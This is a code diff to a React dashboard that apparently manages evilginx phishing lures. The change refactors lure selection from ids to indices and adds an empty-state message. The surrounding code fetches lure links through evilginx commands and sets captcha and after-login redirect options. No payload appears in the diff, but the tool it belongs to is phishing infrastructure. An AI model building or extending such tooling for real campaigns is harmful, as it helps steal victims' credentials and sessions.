@@ -319,17 +319,14 @@ export default function Dashboard() {
     });
   };
 
-  const handleLureChange = async (lureId: string) => {
-    const selectedLureIndex = lures.findIndex((lure) => lure.id === lureId);
-    if (selectedLureIndex === -1) return;
-
-    const selected = lures[selectedLureIndex];
-    setSelectedLure(selected);
+  const handleLureChange = async (lureIndex: number) => {
+    const selectedLure = lures[lureIndex];
+    setSelectedLure(selectedLure);
 
     // Get the exact URL by calling the evilginx command through our API
     try {
       const lureUrlResponse = await fetch(
-        `/api/lure-url?lureIndex=${selectedLureIndex}`
+        `/api/lure-url?lureIndex=${lureIndex}`
       );
       if (lureUrlResponse.ok) {
         const data = await lureUrlResponse.json();
@@ -341,7 +338,9 @@ export default function Dashboard() {
       console.error("Error fetching lure URL:", error);
       // Fall back to the API-based approach if the command fails
       try {
-        const linkResponse = await fetch(`/api/full-link?lureId=${lureId}`);
+        const linkResponse = await fetch(
+          `/api/full-link?lureId=${selectedLure.id}`
+        );
         if (linkResponse.ok) {
           const data = await linkResponse.json();
           setFullLink(data.fullUrl);
@@ -359,11 +358,11 @@ export default function Dashboard() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          afterLoginRedirect: selected.redirect_url || "",
-          useCaptcha: selected.redirector === "main",
-          linkPath: selected.path.startsWith("/")
-            ? selected.path.substring(1)
-            : selected.path,
+          afterLoginRedirect: selectedLure.redirect_url || "",
+          useCaptcha: selectedLure.redirector === "main",
+          linkPath: selectedLure.path.startsWith("/")
+            ? selectedLure.path.substring(1)
+            : selectedLure.path,
         }),
       });
 
@@ -746,18 +745,22 @@ export default function Dashboard() {
             <div className="flex-grow">
               <div className="text-sm text-gray-400">Your Link:</div>
               <div className="flex items-center space-x-2 mb-2">
-                {lures.length > 0 && (
+                {lures.length > 0 ? (
                   <select
                     className="text-gray-200 bg-[#1B2028] border border-gray-700 rounded px-2 py-1 text-sm"
-                    value={selectedLure?.id || ""}
-                    onChange={(e) => handleLureChange(e.target.value)}
+                    value={lures.indexOf(selectedLure || lures[0])}
+                    onChange={(e) => handleLureChange(Number(e.target.value))}
                   >
-                    {lures.map((lure) => (
-                      <option key={lure.id} value={lure.id}>
+                    {lures.map((lure, index) => (
+                      <option key={index} value={index}>
                         {lure.phishlet} - {lure.path}
                       </option>
                     ))}
                   </select>
+                ) : (
+                  <p className="text-sm text-gray-500 mb-4">
+                    No lures available
+                  </p>
                 )}
               </div>
               <div className="text-gray-300 font-medium flex items-center space-x-2">
